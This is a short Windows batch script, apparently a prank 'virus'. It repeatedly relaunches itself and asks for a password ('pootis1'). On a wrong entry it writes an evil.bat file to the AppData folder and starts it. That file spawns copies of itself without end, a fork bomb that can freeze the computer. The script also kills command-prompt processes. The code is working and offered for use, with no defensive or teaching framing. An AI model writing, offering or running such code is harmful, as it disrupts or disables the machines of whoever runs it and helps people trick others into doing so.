@echo off
set login=false

:start
if "%login%" equ "false" (
if "%1" equ "Restarted" goto %1 
) ELSE (
taskkill /im cmd.exe
)

:again
if /i "%login%" equ "false" (
echo N|start "" /WAIT cmd.exe /C "%~F0" Restarted > NUL
goto :again
) ELSE (
taskkill /im cmd.exe
)


:Restarted
if /i "%login%" equ "false" ( 
echo Input password or the computer will get terminated
set /p password="Password> "
) ELSE (
taskkill /im cmd.exe
)

if /i "%password%" equ "pootis1" (
goto no 
) ELSE (
goto yes
)

:no
cls
echo Virus terminated. have a nice day ;)
pause
set login=true
goto again
taskkill /im cmd.exe

:yes
color 0c
echo WRONG PASSWORD!
ECHO INITIATING VIRUS!

cd %appdata%
echo :start > evil.bat
echo start evil.bat >> evil.bat
echo goto start >> evil.bat
start evil.bat
